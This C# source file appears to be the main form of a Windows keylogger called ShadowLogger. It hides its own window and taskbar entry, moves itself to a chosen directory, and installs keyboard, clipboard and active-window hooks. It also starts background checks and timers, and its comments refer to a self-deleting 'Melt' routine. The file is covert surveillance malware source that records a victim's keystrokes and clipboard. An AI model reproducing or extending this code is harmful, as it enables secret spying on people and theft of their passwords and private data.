using System;
using System.Drawing;
using System.Threading;
using System.Windows.Forms;
using ShadowLogger.bin.HelperMethods;
using ShadowLogger.bin.Hooks;
using ShadowLogger.bin.System_EventHandlers;

namespace ShadowLogger.bin {

    //TODO:BUGS
    //none?

    public partial class MainForm : Form {
        public MainForm() {
            InitializeComponent();
        }

        private readonly KeyboardHook _kh = new KeyboardHook();
        private readonly ClipboardHook _ch = new ClipboardHook();
        private readonly WindowChangedHook _wch = new WindowChangedHook();


        //TODO: FIX: UAC IS RETURNING ENABLED ON SYSTEM WITH UAC OFF. (Windows 8 problem afaik, find alternative)
        //TODO: Replace Melt void with File.Move?

        private void MainForm_FormClosing(object sender, FormClosingEventArgs e) {
            UnLoadHooks();
            ManageHandlers.RemoveHandlers();
        }

        private void MainForm_Load(object sender, EventArgs e) {
            this.Region = new Region(new Rectangle(0, 0, 0, 0));
            this.ShowInTaskbar = false;
            this.Visible = false;

            //Changes the app path to where i want it to be.
            if (Application.StartupPath != GlobalVariables.GlobalVariables.AppDirectoryLocation) { 
                SystemStartup.ChangeAppPath();
                return;
            }

            LoadHooks();
            ManageHandlers.AddHandlers();

            Thread t = new Thread(ApplicationMethods.StartupChecks);
            t.Start();

            Timers_Management.TimersHandling.InitializeTimers();
        }


        private void LoadHooks() {
            _kh.CreateHook();
            _ch.Install();
            _wch.CreateHook();
        }

        private void UnLoadHooks() {
            _kh.DisposeHook();
            _ch.Uninstall();
            _wch.DisposeHook();
        }
    }
}